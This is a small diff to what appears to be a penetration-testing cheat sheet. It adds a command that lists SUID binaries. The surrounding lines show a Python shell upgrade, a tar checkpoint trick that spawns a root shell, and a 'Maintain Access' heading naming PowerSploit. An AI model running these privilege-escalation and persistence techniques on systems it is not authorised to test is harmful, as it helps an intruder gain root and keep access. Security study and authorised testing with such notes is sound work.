@@ -31,6 +31,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash");'; export TERM=xterm
     ./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh>
 
 find / -type f -user root -perm -u=s 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
 
 ## Maintain Access
 - PowerSploit
